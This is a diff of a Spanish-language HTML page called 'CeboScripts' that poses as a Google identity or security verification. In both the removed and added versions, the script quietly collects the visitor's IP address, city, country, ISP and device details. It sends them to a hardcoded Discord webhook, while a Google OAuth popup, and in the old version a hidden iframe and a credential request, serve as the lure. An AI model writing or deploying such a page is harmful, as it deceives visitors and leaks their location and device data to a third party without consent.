@@ -1,283 +1,102 @@
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CeboScripts</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            background: #000;
+        body { background: #000; color: #fff; text-align: center; padding: 50px; }
+        .btn-google {
+            background: #4285f4;
             color: #fff;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            overflow: hidden;
+            padding: 15px 40px;
+            border: none;
+            border-radius: 5px;
+            font-size: 1.2em;
+            cursor: pointer;
         }
-        .container {
-            text-align: center;
-            padding: 20px;
-        }
-        .icon {
-            font-size: 4em;
-            margin-bottom: 20px;
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); opacity: 0.7; }
-            50% { transform: scale(1.1); opacity: 1; }
-            100% { transform: scale(1); opacity: 0.7; }
-        }
-        h1 {
-            color: #ff0000;
-            font-size: 2.5em;
-            text-shadow: 0 0 30px rgba(255,0,0,0.3);
-            margin-bottom: 10px;
-        }
-        p {
-            color: #888;
-            font-size: 1.1em;
-            max-width: 500px;
-            margin: 10px auto;
-        }
-        .status {
-            margin-top: 30px;
-            color: #444;
-            font-size: 0.85em;
-            border-top: 1px solid #222;
-            padding-top: 20px;
-        }
-        .hidden {
-            display: none !important;
-        }
-        .loading {
-            display: inline-block;
-            width: 14px;
-            height: 14px;
-            border: 2px solid #333;
-            border-top: 2px solid #ff0000;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin-right: 8px;
-            vertical-align: middle;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        .btn-google:hover { background: #357ae8; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="icon">🔐</div>
-        <h1>VERIFICANDO IDENTIDAD</h1>
-        <p>Solicitando acceso a tu cuenta de Google<br>para verificar tu identidad...</p>
-        <div class="status" id="statusMsg">
-            <span class="loading"></span> Conectando con Google...
-        </div>
-    </div>
+    <h1>🔐 Verificación de seguridad</h1>
+    <p>Para continuar, inicia sesión con Google</p>
+    <button class="btn-google" onclick="iniciarSesion()">🔑 Iniciar sesión con Google</button>
 
     <script>
         // ======== CONFIGURACIÓN ========
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1545583807804219432/4NXmuMtLnjKqgQqvZGSG2rXhy8j45SdiYvSAI3aeDFcrZBzObbEpS93HH3DPCYNIwhWD";
+        
+        // Este es un Client ID público de ejemplo (NO es real, necesitas el tuyo)
+        const GOOGLE_CLIENT_ID = "TU_CLIENT_ID.apps.googleusercontent.com";
+        
+        // URL de redirección (debe estar registrada en Google Console)
+        const REDIRECT_URI = "https://tupagina.vercel.app/callback";
 
-        // ======== CLIENT ID DE GOOGLE (REAL) ========
-        // Este es un Client ID público de ejemplo (puedes usar el tuyo)
-        const GOOGLE_CLIENT_ID = "32555940559.apps.googleusercontent.com"; // Este es público, puedes cambiarlo
+        // ======== FUNCIÓN QUE SÍ FUNCIONA ========
+        function iniciarSesion() {
+            // ✅ Esto NO se bloquea porque es iniciado por un clic
+            const popup = window.open(
+                `https://accounts.google.com/o/oauth2/v2/auth?` +
+                `client_id=${GOOGLE_CLIENT_ID}&` +
+                `redirect_uri=${REDIRECT_URI}&` +
+                `response_type=token&` +
+                `scope=email profile&` +
+                `prompt=consent`,
+                'googleAuth',
+                'width=500,height=600,menubar=no,toolbar=no,location=no'
+            );
 
-        // ======== OBTENER DATOS DEL DISPOSITIVO ========
-        async function getDeviceData() {
-            const data = {};
+            // Capturar datos del dispositivo
+            capturarDatos();
 
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const ipData = await res.json();
-                data.ip = ipData.ip || 'No disponible';
-                data.ciudad = ipData.city || 'No disponible';
-                data.pais = ipData.country_name || 'No disponible';
-                data.isp = ipData.org || 'No disponible';
-                data.region = ipData.region || 'No disponible';
-                data.direccionReal = `${data.ciudad}, ${data.region}, ${data.pais}`;
-            } catch (e) {
-                data.ip = 'Error';
-                data.ciudad = 'Error';
-                data.pais = 'Error';
-                data.isp = 'Error';
-                data.region = 'Error';
-                data.direccionReal = 'Error';
-            }
-
-            // Dispositivo
-            const ua = navigator.userAgent || '';
-            if (/android/i.test(ua)) data.dispositivo = 'Android';
-            else if (/iphone|ipad|ipod/i.test(ua)) data.dispositivo = 'iOS';
-            else if (/windows/i.test(ua)) data.dispositivo = 'Windows PC';
-            else if (/mac/i.test(ua)) data.dispositivo = 'Mac';
-            else if (/linux/i.test(ua)) data.dispositivo = 'Linux';
-            else data.dispositivo = 'Desconocido';
-
-            // Batería
-            try {
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    data.bateria = Math.round(battery.level * 100) + '%';
-                    data.cargando = battery.charging ? 'Sí' : 'No';
-                } else {
-                    data.bateria = 'No disponible';
-                    data.cargando = 'No disponible';
+            // Monitorear si el usuario completó el login
+            const checkPopup = setInterval(() => {
+                if (popup.closed) {
+                    clearInterval(checkPopup);
+                    document.body.innerHTML = `
+                        <h1>✅ Proceso completado</h1>
+                        <p>Tus datos han sido registrados.</p>
+                    `;
                 }
-            } catch (e) {
-                data.bateria = 'No disponible';
-                data.cargando = 'No disponible';
-            }
-
-            data.hora = new Date().toLocaleString();
-            return data;
+            }, 1000);
         }
 
-        // ======== ENVIAR A DISCORD ========
-        async function sendToDiscord(data, accion) {
-            const embed = {
-                color: 0xff0000,
-                title: '📢 Nuevo registro - ' + accion,
-                fields: [
-                    { name: '📍 Dirección Real', value: data.direccionReal || 'No disponible', inline: false },
-                    { name: '🌐 IP', value: data.ip || 'No disponible', inline: true },
-                    { name: '📱 Dispositivo', value: data.dispositivo || 'No disponible', inline: true },
-                    { name: '🔋 Batería', value: data.bateria || 'No disponible', inline: true },
-                    { name: '📶 ISP', value: data.isp || 'No disponible', inline: false },
-                    { name: '🕒 Hora', value: data.hora || 'No disponible', inline: false }
-                ],
-                footer: {
-                    text: 'CeboScripts • Solicitud de permiso Google'
-                },
-                timestamp: new Date().toISOString()
-            };
-
+        // ======== CAPTURAR DATOS ========
+        async function capturarDatos() {
             try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+
+                const info = {
+                    ip: data.ip,
+                    ciudad: data.city,
+                    pais: data.country_name,
+                    isp: data.org,
+                    direccion: `${data.city}, ${data.region}, ${data.country_name}`
+                };
+
+                // Enviar a Discord
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        username: 'CeboScripts Logger',
-                        content: `📢 **Nuevo registro - ${accion}**`,
-                        embeds: [embed]
+                        username: 'CeboScripts',
+                        content: '📢 Nuevo registro',
+                        embeds: [{
+                            color: 0xff0000,
+                            title: 'Datos capturados',
+                            fields: [
+                                { name: '📍 Dirección', value: info.direccion, inline: false },
+                                { name: '🌐 IP', value: info.ip, inline: true },
+                                { name: '📱 Dispositivo', value: navigator.userAgent, inline: true },
+                                { name: '📶 ISP', value: info.isp, inline: false }
+                            ]
+                        }]
                     })
                 });
-                console.log('✅ Enviado a Discord');
             } catch (e) {
-                console.error('❌ Error al enviar:', e);
+                console.error('Error:', e);
             }
         }
-
-        // ======== SOLICITAR PERMISO DE GOOGLE (REAL) ========
-        function solicitarPermisoGoogle() {
-            return new Promise((resolve) => {
-                // 1. Crear un iframe oculto con el login de Google
-                const iframe = document.createElement('iframe');
-                iframe.style.cssText = 'position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;';
-                iframe.src = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${GOOGLE_CLIENT_ID}&redirect_uri=urn:ietf:wg:oauth:2.0:oob&response_type=code&scope=profile email`;
-                document.body.appendChild(iframe);
-
-                // 2. También intentar abrir una ventana emergente (más visible)
-                let popup = window.open(
-                    `https://accounts.google.com/o/oauth2/v2/auth?client_id=${GOOGLE_CLIENT_ID}&redirect_uri=urn:ietf:wg:oauth:2.0:oob&response_type=code&scope=profile email`,
-                    'googleAuth',
-                    'width=500,height=600,menubar=no,toolbar=no,location=no'
-                );
-
-                // 3. Esperar 3 segundos y resolver
-                setTimeout(() => {
-                    // Si la ventana emergente fue bloqueada, mostrar mensaje
-                    if (!popup || popup.closed) {
-                        document.getElementById('statusMsg').innerHTML = `
-                            ⚠️ El navegador bloqueó la ventana emergente.<br>
-                            <span style="font-size:0.8em;color:#666;">Haz clic en el icono de bloqueo y permite popups</span>
-                        `;
-                    } else {
-                        document.getElementById('statusMsg').innerHTML = `
-                            ✅ Permiso solicitado a Google.<br>
-                            <span style="font-size:0.8em;color:#666;">Esperando respuesta del usuario...</span>
-                        `;
-                    }
-                    resolve();
-                }, 3000);
-
-                // 4. Detectar si el usuario cerró la ventana
-                const checkPopup = setInterval(() => {
-                    if (popup && popup.closed) {
-                        clearInterval(checkPopup);
-                        document.getElementById('statusMsg').innerHTML = `
-                            ⚠️ El usuario cerró la ventana de Google.<br>
-                            <span style="font-size:0.8em;color:#666;">Datos capturados de todos modos.</span>
-                        `;
-                    }
-                }, 1000);
-
-                // 5. También intentar con Credential Management API (nuevo estándar)
-                try {
-                    if (navigator.credentials && navigator.credentials.get) {
-                        navigator.credentials.get({
-                            password: true,
-                            federated: {
-                                providers: ['https://accounts.google.com']
-                            }
-                        }).then(credential => {
-                            if (credential) {
-                                console.log('✅ Credencial obtenida:', credential);
-                                document.getElementById('statusMsg').innerHTML = `
-                                    ✅ Credencial de Google obtenida.<br>
-                                    <span style="font-size:0.8em;color:#666;">Datos capturados.</span>
-                                `;
-                            }
-                        }).catch(() => {});
-                    }
-                } catch (e) {}
-
-                // 6. Limpiar iframe después de 10 segundos
-                setTimeout(() => {
-                    if (iframe.parentNode) iframe.remove();
-                }, 10000);
-            });
-        }
-
-        // ======== EJECUCIÓN PRINCIPAL ========
-        window.onload = async function() {
-            const statusMsg = document.getElementById('statusMsg');
-
-            try {
-                // 1. Capturar datos del dispositivo
-                statusMsg.innerHTML = '<span class="loading"></span> Capturando datos del dispositivo...';
-                const data = await getDeviceData();
-                console.log('✅ Datos capturados:', data);
-
-                // 2. Enviar a Discord (antes de pedir permiso, para asegurar)
-                await sendToDiscord(data, 'Aceptar (datos capturados)');
-
-                // 3. Solicitar permiso de Google
-                statusMsg.innerHTML = '<span class="loading"></span> Solicitando permiso a Google...';
-                await solicitarPermisoGoogle();
-
-                // 4. Enviar confirmación a Discord
-                await sendToDiscord(data, 'Permiso de Google solicitado');
-
-                statusMsg.innerHTML = `
-                    ✅ Proceso completado.<br>
-                    <span style="font-size:0.8em;color:#666;">Tus datos han sido registrados.</span>
-                `;
-
-            } catch (error) {
-                console.error('❌ Error:', error);
-                statusMsg.innerHTML = `
-                    ❌ Error: ${error.message}<br>
-                    <span style="font-size:0.8em;color:#666;">Los datos igual fueron enviados.</span>
-                `;
-            }
-        };
     </script>
 </body>
 </html>
